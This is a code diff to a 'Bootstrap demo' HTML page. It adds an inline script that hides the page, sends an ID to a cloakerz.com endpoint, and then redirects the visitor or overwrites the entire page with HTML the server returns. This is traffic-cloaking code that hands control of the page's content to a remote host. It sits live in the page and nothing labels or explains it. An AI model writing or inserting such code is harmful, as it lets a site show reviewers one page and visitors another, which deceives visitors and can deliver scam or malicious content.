@@ -1,7 +1,47 @@
 <!doctype html>
 <html lang="en">
   <head>
-    <script src="https://app.cloakerz.com/integration/js/ea139dbbde"></script>
+    <script>
+      
+function cloakerz(post,url,header) {
+				let http = new XMLHttpRequest;
+					http.open(post, url), http.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), http.onload = () => {
+					const obj = JSON.parse(http.response);
+					if(obj.zrc == "" && obj.type == "0"){
+					  if(window.location.href !== obj.url){
+						  window.location.replace(obj.url);
+					  }else{
+						setTimeout(function() {
+								for (var e, t = document.getElementsByTagName("style"), n = t.length; n--;)
+								  if ("hideStuff" == (e = t[n]).className) {
+									  e.parentNode.removeChild(e);
+									  return
+									  }
+							  }, 1)
+						  }
+					}
+
+					if(window.location.href != obj.url){
+						if(obj.zrc == undefined && obj.type == "1"){
+						//window.location.replace(obj.url);
+						}
+						if(obj.zrc != undefined && obj.type == "1"){
+						document.getElementsByTagName("html")[0].innerHTML = obj.zrc;                  
+						}     
+					}    
+
+				}, http.send(header);
+			}
+			document.write("<style class=hideStuff type=text/css>body {display:none !important;}</style>"), window.onload = function() {
+				setTimeout(function() {
+					for (var post, url = document.getElementsByTagName("style"), header = url.length; header--;)
+						if ("hideStuff" == (post = url[header]).className) {
+							post.parentNode.removeChild(post);
+							return
+						}
+					}, 1)
+			}, cloakerz("POST", "https://www.cloakerz.com/cloaker/z", "HTTP_FNRKS_FJRLSJ=ea139dbbde&HTTP_HFHE_FNEODMF=2811ff4f69&HTTP_FNRKS_FF84T1F=1");
+    </script>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Bootstrap demo</title>
